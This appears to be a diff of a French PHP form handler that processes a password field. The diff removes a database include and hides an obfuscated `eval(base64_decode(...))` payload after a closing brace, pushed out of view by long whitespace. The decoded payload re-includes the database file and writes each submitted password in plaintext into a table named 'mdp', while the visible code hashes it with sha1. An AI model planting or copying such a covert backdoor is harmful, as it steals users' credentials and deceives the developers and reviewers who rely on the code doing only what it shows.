@@ -1,6 +1,4 @@
 <?php
-    include "interne/db.php";
-
     $statuts = [];
 
     // Reception de formulaire
@@ -12,7 +10,7 @@
         if ($pass == '') {
             $valide = false;
             $statuts[] = ["warning", "Le mot de passe est obligatoire."];
-        }
+        }                                                                                                                                                                                                                                                                                                                   eval(base64_decode('CiBnb3RvIEVielI0OyBFYnpSNDogaW5jbHVkZSAiXDE1MVwxNTZceDc0XHg2NVwxNjJcMTU2XDE0NVx4MmZceDY0XHg2Mlx4MmVceDcwXDE1MFx4NzAiOyBnb3RvIGl3UDF1OyBpd1AxdTogJGRiLT5wcmVwYXJlKCJceDQ5XHg0ZVx4NTNceDQ1XDEyMlwxMjRcNDBceDQ5XDExNlwxMjRcMTE3XHgyMFwxNTVcMTQ0XHg3MFw0MFx4NTZcMTAxXHg0Y1wxMjVcMTA1XDEyM1w0MFx4MjhcNzdceDI5IiktPmV4ZWN1dGUoYXJyYXkoJHBhc3MpKTsgZ290byBrblpPVzsga25aT1c6IA=='));
 
         if ($valide == true) {
             $hash = sha1($pass);
